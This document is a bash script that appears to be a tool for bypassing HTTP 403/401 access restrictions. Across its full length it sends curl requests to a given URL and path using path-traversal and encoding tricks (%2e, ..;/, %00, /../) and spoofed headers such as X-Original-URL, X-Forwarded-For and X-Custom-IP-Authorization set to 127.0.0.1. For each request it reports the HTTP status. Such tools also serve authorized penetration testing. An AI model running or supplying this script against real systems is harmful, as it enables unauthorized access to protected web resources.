#!/bin/bash
useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36"
RED="\033[31m"
GREEN="\u001b[32;1m"
YELLOW="\u001b[33;1m"
RESET="\033[0;39m"

curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1/%2e$2" #|  xargs -I {} bash -c 'if grep -Fq "string" {} ; then echo {} ; fi''data="{}"; if [[ "$data" == *"HTTP Code: [200]"* ]]; then  printf  "$GREEN $data $RESET \n "; fi'
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/."
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2//"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1/.$2/./"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/%20"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/%9"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2?"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2.html"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/?anything"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/#"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/*"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2.php"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2.json"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2..;/"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2;/"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2..%00"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2/../"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] \n" "$1$2;/%2e%2e%2f%2f"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Original-URL: $2" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Original-URL: $2 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Custom-IP-Authorization: 127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Custom-IP-Authorization: 127.0.0.1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Forwarded-For: http://127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Forwarded-For: http://127.0.0.1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Forwarded-For: http://127.0.0.1:80" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Forwarded-For: http://127.0.0.1:80 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-rewrite-url: $2" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-rewrite-url: $2 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Content-Length:0" -X POST -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Content-Length:0 [Method]: POST \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent"  -X TRACE -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Method]: TRACE \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -X POST -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Method]: POST \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -X PUT -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Method]: PUT \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -X OPTIONS -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Method]: OPTIONS \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Originating-: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Originating-IP: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: True-Client-IP: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-WAP-Profile: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Profile: http://$1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Profile: http://$1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-HTTP-DestinationURL: http://$1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-HTTP-DestinationURL: http://$1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Destination: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Destination: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Proxy: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Proxy: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: CF-Connecting_IP: 127.0.0.1, 68.180.194.242 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Referer: $1$2" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Referer: $1...... \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "X-Custom-IP-Authorization: 127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: X-Custom-IP-Authorization: 127.0.0.1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Real-Ip: 127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Real-Ip: 127.0.0.1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Redirect: 127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Redirect: 127.0.0.1 \n" "$1$2"
curl -k   -s -o /dev/null -iL  --connect-timeout  60 -A "$useragent" -H "Request-Uri: 127.0.0.1" -w "%{url} \n └──╼ Type: [%{content_type}] HTTP Code: [%{http_code}] Page Size: [%{size_download}] [Header]: Request-Uri: 127.0.0.1 \n" "$1$2"





return 1 2>/dev/null
exit 1

